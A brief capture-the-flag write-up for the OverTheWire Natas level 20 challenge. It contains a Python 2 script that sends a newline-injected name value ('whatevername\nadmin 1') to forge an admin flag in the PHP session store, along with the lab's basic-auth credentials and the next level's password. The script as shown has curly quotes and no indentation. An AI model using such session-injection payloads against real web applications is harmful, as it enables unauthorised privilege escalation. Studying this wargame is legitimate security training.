# natas21

```python
import httplib,sys
from base64 import b64encode
from urllib import urlencode

def check(sessid):
httpClient = None
try:
userAndPass = b64encode(b”natas20:eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF”).decode(“ascii”)
body=urlencode({‘name’ : ‘whatevername\nadmin 1’})
cookie = ‘PHPSESSID=’+str(sessid)
headers = { ‘Authorization’ : ‘Basic %s’ % userAndPass , ‘Content-Type’: ‘application/x-www-form-urlencoded’ , ‘Cookie’ : cookie }
httpClient = httplib.HTTPConnection(‘natas20.natas.labs.overthewire.org’, 80, timeout=300)
httpClient.request(‘POST’, ‘/index.php?debug=a’, body=body, headers=headers)
response = httpClient.getresponse()
responseData = response.read()
print responseData
except Exception, e:
print e
finally:
if httpClient:
httpClient.close()

check(‘whateversessid’)
```

Injection: “whatevername\nadmin 1” (web browser might not work!)
Run the program for two times: first time executing mywrite to inject the session, second time executing myread to set admin to 1
Password: IFekPyrQXftziDEsUr3x21sYuahypdgJ
